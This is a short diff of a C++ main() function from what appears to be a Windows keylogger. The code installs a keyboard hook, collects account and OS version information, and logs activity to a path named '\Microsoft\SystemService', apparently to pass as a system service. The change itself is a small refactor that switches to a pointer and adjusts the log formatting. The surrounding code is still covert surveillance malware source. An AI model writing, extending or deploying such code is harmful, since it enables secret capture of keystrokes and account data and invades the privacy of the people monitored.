@@ -22,7 +22,9 @@ int main() {
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
 
-  Stream::GetAccountInfo(clientInfo);
+  pClientInfo = &clientInfo;
+
+  Stream::GetAccountInfo(pClientInfo);
 
   std::string path = Stream::GetPath("\\Microsoft\\SystemService");
 
@@ -32,9 +34,9 @@ int main() {
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, false);
 
   std::ostringstream ostream;
-  DWORD major = clientInfo.osVersionInfo.dwMajorVersion;
-  DWORD minor = clientInfo.osVersionInfo.dwMinorVersion;
-  ostream << "[*] OS Info: " << major << " " << minor << " [*]";
+  DWORD major = pClientInfo->osVersionInfo.dwMajorVersion;
+  DWORD minor = pClientInfo->osVersionInfo.dwMinorVersion;
+  ostream << "\n[*] OS Info: " << major << " " << minor << " [*]";
   std::string write = ostream.str();
   Stream::WriteLog(write, KeyHook::activeProcess, false);
 
